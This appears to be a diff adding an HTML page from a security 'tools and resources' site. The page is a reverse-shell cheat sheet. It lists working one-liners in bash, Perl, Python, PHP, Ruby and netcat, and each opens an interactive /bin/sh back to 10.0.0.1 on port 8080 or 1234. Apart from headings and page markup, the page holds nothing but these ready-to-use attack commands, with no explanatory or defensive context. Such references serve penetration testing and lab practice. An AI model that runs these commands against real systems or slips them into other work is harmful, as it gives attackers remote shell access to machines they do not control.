@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Reverse Shells</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+        <link rel="stylesheet" href="styles_resources.css">
+    </head>
+    <body>
+        <div class="container">
+            <center>
+                <p>
+                    <h1 class="main-head">Reverse Shells<span id="h-cursor">|</span></h1>
+                </p>
+                <p>
+                    <a href="index.html">home</a> . <a href="resources.html">tools and resources</a> . <a href="reverseshells.html">Reverse Shells</a>
+                </p>
+            </center>
+            <div class="rshell">
+                <h2><strong>BASH</strong></h2>
+                <kbd>
+                    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+                </kbd>
+            </div>
+            <div class="rshell">
+                <h2><strong>PERL</strong></h2>
+                <div class="card">
+                    <div class="card-body">
+                    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+                </div>
+            </div>
+            </div>
+            <div class="rshell">
+                <h2><strong>PYTHON</strong></h2>
+                <div class="card">
+                    <div class="card-body">
+                        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+                    </div>
+                </div>
+            </div>
+            <div class="rshell">
+                <h2><strong>PHP</strong></h2>
+                <kbd>
+                    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+                </kbd>
+            </div>
+            <div class="rshell">
+                <h2><strong>RUBY</strong></h2>
+                <kbd>
+                    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+                </kbd>
+            </div>
+            <div class="rshell">
+                <h2><strong>NETCAT</strong></h2>
+                <kbd>
+                    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+                </kbd><br><br>
+                <kbd>
+                    nc -e /bin/sh 10.0.0.1 1234
+                </kbd>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+    </body>
+</html>
